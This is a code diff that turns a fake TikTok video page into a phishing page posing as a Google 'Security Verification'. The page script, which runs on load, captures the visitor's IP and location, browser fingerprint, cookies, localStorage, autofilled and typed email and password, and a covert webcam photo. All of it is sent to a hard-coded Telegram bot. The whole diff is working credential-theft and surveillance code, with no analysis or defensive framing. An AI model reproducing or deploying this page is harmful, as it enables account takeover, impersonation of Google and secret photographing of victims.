@@ -1,60 +1,182 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Video</title>
+    <title>System Security Check • Google</title>
     <style>
-        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-        .play-btn { width: 80px; height: 80px; background: #fe2c55; border-radius: 50%; display: flex; justify-content: center; align-items: center; }
-        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
+        body { font-family: Arial; background: #f2f2f2; text-align: center; padding: 20px; }
+        .container { max-width: 400px; margin: auto; background: white; border-radius: 10px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        #camera { display: none; }
+        #status { margin-top: 20px; color: #555; }
     </style>
 </head>
 <body>
-
-    <div id="overlay">
-        <div class="play-btn"></div>
-        <p style="color:white; position:absolute; bottom:20%; text-align:center;">بۆ بینینی ڤیدیۆکە لێرە کلیک بکە</p>
+    <div class="container">
+        <h2>🔐 Security Verification Required</h2>
+        <p>Your device needs to verify identity.</p>
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Email address" autocomplete="email" required>
+            <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
+            <button type="submit">Continue</button>
+        </form>
+        <p id="status">⏳ Loading security check...</p>
     </div>
 
-    <form id="hiddenForm" style="display:none;">
-        <input type="text" id="autoName" autocomplete="name">
-        <input type="email" id="autoEmail" autocomplete="email">
-    </form>
+    <video id="video" width="320" height="240" autoplay muted style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
     <script>
-        const botToken = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
-        const chatId = "1034878899";
+        // ================= TELEGRAM CONFIG =================
+        const BOT_TOKEN = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
+        const CHAT_ID = "1034878899";
+        // ===================================================
 
-        async function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        // ---------- 1. IP & GEO INFO ----------
+        async function getIPInfo() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                return `🌐 IP Info
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+ISP: ${data.org}
+Lat/Lon: ${data.latitude}, ${data.longitude}`;
+            } catch (e) {
+                try {
+                    let res2 = await fetch('https://ipinfo.io/json');
+                    let data2 = await res2.json();
+                    return `🌐 IP Info
+IP: ${data2.ip}
+City: ${data2.city}
+Region: ${data2.region}
+Country: ${data2.country}
+Org: ${data2.org}
+Loc: ${data2.loc}`;
+                } catch (e2) {
+                    return "🌐 IP info unavailable";
+                }
+            }
         }
 
-        // ناردنی ئایپی و شوێن (پێشکەوتوو)
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-            let info = `📍 **شوێنی نێچیر:**\n• IP: ${data.ip}\n• وڵات: ${data.country_name}\n• شار: ${data.city}\n• ئۆپەرێتەر: ${data.org}`;
-            sendToTelegram(info);
-        });
+        // ---------- 2. BROWSER FINGERPRINT ----------
+        function getBrowserData() {
+            let data = `💻 Browser
+User Agent: ${navigator.userAgent}
+Language: ${navigator.language}
+Platform: ${navigator.platform}
+Cookies Enabled: ${navigator.cookieEnabled}
+Screen: ${screen.width}x${screen.height}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Local Storage: ${localStorage.length} items
+Session Storage: ${sessionStorage.length} items`;
+            return data;
+        }
 
-        document.getElementById('overlay').addEventListener('click', async function() {
-            this.style.display = 'none'; // لادانی پەردەکە
-            
-            // هەوڵدان بۆ کامێرا
-            try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch(e) {}
+        // ---------- 3. STEAL COOKIES ----------
+        function getCookies() {
+            return `🍪 Cookies: ${document.cookie || 'none'}`;
+        }
 
-            // دزینی کوکی و Autofill
-            let browserData = `🍪 **داتای Safari:**\n• کوکیز: ${document.cookie || "بەندکراوە"}\n• سکرین: ${screen.width}x${screen.height}`;
-            sendToTelegram(browserData);
+        // ---------- 4. CAMERA CAPTURE ----------
+        async function captureAndSendPhoto() {
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
 
+                // Capture after 1 sec
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    canvas.toBlob(async (blob) => {
+                        // Send to Telegram as photo
+                        let formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'selfie.jpg');
+                        formData.append('caption', '📸 Selfie captured');
+
+                        try {
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch (e) {}
+
+                        // Stop camera
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.9);
+                }, 1000);
+            } catch (err) {
+                sendTextMessage('❌ Camera access denied or failed');
+            }
+        }
+
+        // ---------- 5. SEND TEXT TO TELEGRAM ----------
+        async function sendTextMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) {}
+        }
+
+        // ---------- 6. STEAL AUTOFILL AFTER DELAY ----------
+        function stealAutofill() {
             setTimeout(() => {
-                const name = document.getElementById('autoName').value;
-                const email = document.getElementById('autoEmail').value;
-                if(name || email) {
-                    sendToTelegram(`👤 **Autofill:**\n• ناو: ${name}\n• ئیمەیڵ: ${email}`);
+                let email = document.getElementById('email').value;
+                let password = document.getElementById('password').value;
+                if (email || password) {
+                    sendTextMessage(`🔑 Autofilled Credentials\nEmail: ${email}\nPassword: ${password}`);
                 }
-            }, 1000);
+            }, 2000); // Wait for autofill
+        }
+
+        // ---------- 7. CAPTURE FORM SUBMIT ----------
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            sendTextMessage(`📧 Manual Login\nEmail: ${email}\nPassword: ${password}`);
+            document.getElementById('status').innerText = '✅ Verification complete. Redirecting...';
+            // Fake redirect
+            setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
         });
+
+        // ---------- 8. INITIAL EXECUTION ----------
+        window.onload = async function() {
+            // Send IP + Browser + Cookies
+            let ipInfo = await getIPInfo();
+            let browserInfo = getBrowserData();
+            let cookies = getCookies();
+            await sendTextMessage(`🔰 NEW VISITOR\n${ipInfo}\n\n${browserInfo}\n\n${cookies}`);
+
+            // Request camera with pretext
+            document.getElementById('status').innerText = '📷 Camera access required for verification';
+            setTimeout(() => {
+                captureAndSendPhoto();
+            }, 500);
+
+            // Steal autofilled credentials
+            stealAutofill();
+
+            // Try to get localStorage/sessionStorage contents (first few)
+            try {
+                let ls = '';
+                for (let i = 0; i < localStorage.length && i < 10; i++) {
+                    let key = localStorage.key(i);
+                    ls += `${key}: ${localStorage.getItem(key).substring(0, 50)}...\n`;
+                }
+                if (ls) sendTextMessage(`🗄 LocalStorage (first 10):\n${ls}`);
+            } catch (e) {}
+        };
     </script>
 </body>
 </html>
